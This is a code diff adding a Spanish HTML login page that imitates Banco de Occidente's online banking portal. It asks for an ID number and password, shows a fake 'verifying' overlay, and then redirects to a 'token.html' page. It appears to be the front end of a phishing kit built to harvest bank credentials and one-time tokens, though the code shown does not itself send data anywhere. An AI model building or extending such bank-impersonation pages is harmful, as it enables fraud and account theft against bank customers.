@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Occidente - Portal Transaccional</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Main Card -->
+        <div class="card">
+            <!-- Seguridad Badge -->
+            <a href="#/seguridad" class="security-badge">
+                <span class="icon-shield">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="#00ca82" stroke-width="1.8" fill="none"/>
+                        <path d="M12 6 L7 8.5 L7 13 C7 16 9.5 18.5 12 19.5 C14.5 18.5 17 16 17 13 L17 8.5 Z" 
+                              stroke="#00ca82" stroke-width="1.5" fill="none" stroke-linejoin="round"/>
+                        <path d="M10 12.5 L11.5 14 L14 11.5" 
+                              stroke="#00ca82" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                    </svg>
+                </span>
+                <span class="security-text">Seguridad</span>
+            </a>
+
+            <!-- Logo -->
+            <div class="logo-container">
+                <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
+            </div>
+
+            <!-- Welcome Text -->
+            <div class="welcome-text">
+                <p class="welcome">¡Bienvenido! a tu,</p>
+                <p class="portal-title">Portal Transaccional</p>
+            </div>
+
+            <!-- Tabs -->
+            <div class="tabs">
+                <button class="tab active" data-tab="registrado">Registrado</button>
+                <button class="tab" data-tab="sin-registro">Sin registro</button>
+            </div>
+
+            <!-- Tab Content: Registrado -->
+            <div class="tab-content active" id="tab-registrado">
+                <form class="login-form" id="form-registrado">
+                    <!-- Identificación Field -->
+                    <div class="form-group">
+                        <label for="identificacion">Identificación</label>
+                        <div class="input-with-select">
+                            <select class="doc-type" id="tipoDocumento">
+                                <option value="CC">CC</option>
+                                <option value="CE">CE</option>
+                                <option value="NIT">NIT</option>
+                                <option value="PA">PA</option>
+                            </select>
+                            <input type="text" id="numeroDocumento" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="off" required>
+                        </div>
+                    </div>
+
+                    <!-- Contraseña Field -->
+                    <div class="form-group">
+                        <label for="contrasena">Contraseña</label>
+                        <div class="password-container">
+                            <input type="password" id="contrasena" placeholder="Ingresa tu contraseña" class="input-field" required>
+                            <button type="button" class="toggle-password">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#B8BCC8"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Forgot Password Link -->
+                    <div class="forgot-password">
+                        <a href="#">¿Olvidaste tu contraseña?</a>
+                    </div>
+
+                    <!-- Remember Me Checkbox -->
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Recordar mis datos</label>
+                    </div>
+
+                    <!-- Login Button -->
+                    <button type="button" class="btn-login" id="submitBtn">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M10 17L15 12L10 7V17Z" fill="white"/>
+                        </svg>
+                        Ingresar
+                    </button>
+
+                    <!-- Register Button -->
+                    <button type="button" class="btn-register">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/>
+                        </svg>
+                        Regístrate
+                    </button>
+                </form>
+            </div>
+
+            <!-- Tab Content: Sin registro -->
+            <div class="tab-content" id="tab-sin-registro">
+                <form class="login-form" id="form-sin-registro">
+                    <!-- Info Box -->
+                    <div class="info-box">
+                        <p>Para realizar transacciones <strong>regístrate</strong> en nuestro Portal Transaccional.</p>
+                    </div>
+
+                    <!-- Identificación Field -->
+                    <div class="form-group">
+                        <label for="identificacion-nr">Identificación</label>
+                        <div class="input-with-select">
+                            <select class="doc-type" id="docTypeNR">
+                                <option value="CC">CC</option>
+                                <option value="CE">CE</option>
+                                <option value="NIT">NIT</option>
+                                <option value="PA">PA</option>
+                            </select>
+                            <input type="text" id="identificacion-nr" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="off" required>
+                        </div>
+                    </div>
+
+                    <!-- Register Button -->
+                    <button type="button" class="btn-register btn-full">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/>
+                        </svg>
+                        Regístrate
+                    </button>
+
+                    <!-- Login Button -->
+                    <button type="submit" class="btn-login btn-secondary">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M10 17L15 12L10 7V17Z" fill="white"/>
+                        </svg>
+                        Ingresar sin registro
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
+            <p class="loading-text">Verificando información...</p>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+
+            // ============================================
+            // 1. BLOQUEO DE LETRAS EN CAMPOS NUMÉRICOS
+            // ============================================
+            const camposNumericos = ['numeroDocumento', 'identificacion-nr'];
+
+            camposNumericos.forEach(function (id) {
+                const input = document.getElementById(id);
+                if (!input) return;
+
+                input.addEventListener('keypress', function (e) {
+                    if (e.key && e.key.length === 1 && /\D/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+
+                input.addEventListener('input', function () {
+                    const limpio = input.value.replace(/\D/g, '');
+                    if (input.value !== limpio) {
+                        input.value = limpio;
+                    }
+                });
+
+                input.addEventListener('paste', function (e) {
+                    e.preventDefault();
+                    const texto = (e.clipboardData || window.clipboardData).getData('text') || '';
+                    const limpio = texto.replace(/\D/g, '');
+                    const max = parseInt(input.getAttribute('maxlength') || '99', 10);
+                    const start = input.selectionStart || 0;
+                    const end = input.selectionEnd || 0;
+                    const actual = input.value || '';
+                    const nuevo = (actual.slice(0, start) + limpio + actual.slice(end)).slice(0, max);
+                    input.value = nuevo;
+                    input.dispatchEvent(new Event('input', { bubbles: true }));
+                });
+
+                input.addEventListener('drop', function (e) {
+                    e.preventDefault();
+                });
+            });
+
+            // ============================================
+            // 2. FUNCIÓN PARA MOSTRAR OVERLAY Y REDIRIGIR
+            // ============================================
+            const loadingScreen = document.getElementById('loadingScreen');
+
+            function mostrarCargaYRedirigir() {
+                if (loadingScreen) {
+                    loadingScreen.classList.add('active');
+                }
+
+                setTimeout(function () {
+                    window.location.href = 'token.html';
+                }, 2500);
+            }
+
+            // ============================================
+            // 3. BOTÓN INGRESAR - TAB "REGISTRADO"
+            // ============================================
+            const submitBtn = document.getElementById('submitBtn');
+            const numeroDocumento = document.getElementById('numeroDocumento');
+            const contrasena = document.getElementById('contrasena');
+
+            if (submitBtn) {
+                submitBtn.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const numDoc = numeroDocumento ? numeroDocumento.value.trim() : '';
+                    const pass = contrasena ? contrasena.value.trim() : '';
+
+                    if (!numDoc || !pass) {
+                        alert('Por favor completa todos los campos');
+                        return;
+                    }
+
+                    if (numDoc.length < 5) {
+                        alert('La identificación debe tener al menos 5 dígitos');
+                        return;
+                    }
+
+                    mostrarCargaYRedirigir();
+                });
+            }
+
+            // ============================================
+            // 4. BOTÓN INGRESAR - TAB "SIN REGISTRO"
+            // ============================================
+            const formSinRegistro = document.getElementById('form-sin-registro');
+            const identificacionNR = document.getElementById('identificacion-nr');
+
+            if (formSinRegistro) {
+                formSinRegistro.addEventListener('submit', function (e) {
+                    e.preventDefault();
+
+                    const numDoc = identificacionNR ? identificacionNR.value.trim() : '';
+
+                    if (!numDoc) {
+                        alert('Por favor ingresa tu identificación');
+                        return;
+                    }
+
+                    if (numDoc.length < 5) {
+                        alert('La identificación debe tener al menos 5 dígitos');
+                        return;
+                    }
+
+                    mostrarCargaYRedirigir();
+                });
+            }
+
+        });
+    </script>
+</body>
+</html>
